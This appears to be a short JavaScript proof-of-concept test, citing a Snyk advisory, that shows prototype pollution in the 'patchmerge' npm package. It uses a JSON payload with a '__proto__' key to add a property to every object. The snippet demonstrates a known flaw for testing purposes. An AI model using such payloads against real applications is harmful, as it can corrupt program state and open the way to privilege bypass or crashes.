// //https://security.snyk.io/vuln/SNYK-JS-PATCHMERGE-1086585
// test("prototype pollution in patchMerge", () => {
  var patchMerge = require("patchmerge");
  var obj = {};
console.log({}.polluted);
  patchMerge(obj, JSON.parse('{"__proto__": { "polluted": "yes" }}'));
console.log({}.polluted);
// });
